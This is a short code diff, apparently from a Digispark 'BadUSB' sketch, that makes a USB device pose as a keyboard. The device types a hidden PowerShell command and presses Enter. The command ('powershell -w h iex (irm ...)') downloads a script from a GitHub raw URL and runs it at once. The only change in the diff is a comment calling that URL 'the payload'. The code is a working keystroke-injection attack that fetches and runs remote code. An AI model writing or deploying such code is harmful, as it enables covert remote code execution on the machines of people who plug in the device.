@@ -16,7 +16,7 @@ void loop() {
   // Writes the command
   DigiKeyboard.print("powershell -w h ");
   DigiKeyboard.print("iex (irm \"");
-  DigiKeyboard.print("https://raw.githubusercontent.com/Prutserdt/dotfiles/master/Stack/Code/Powershell/script.ps1");  // LINK HERE
+  DigiKeyboard.print("https://raw.githubusercontent.com/Prutserdt/dotfiles/master/Stack/Code/Powershell/script.ps1");  // The payload is here :-)
   DigiKeyboard.print("\")");
   // Enters it
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
